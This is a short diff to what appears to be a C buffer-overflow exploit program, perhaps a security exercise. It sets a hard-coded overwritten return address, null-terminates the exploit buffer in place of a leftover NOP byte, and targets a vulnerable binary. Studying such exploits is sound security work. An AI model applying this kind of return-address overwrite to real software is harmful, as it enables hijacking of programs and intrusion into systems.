@@ -44,7 +44,7 @@ main ( int argc, char * argv[] )
 	*newReturnAddress = 0x3021fe50;
 
 	//The bufferExploit string will end with NULL
-	bufferExploit[-1] = 0x90;'\0';
+	bufferExploit[-1] = '\0';
 
 	args[0] = TARGET;
 	//args[1] = "hi there";
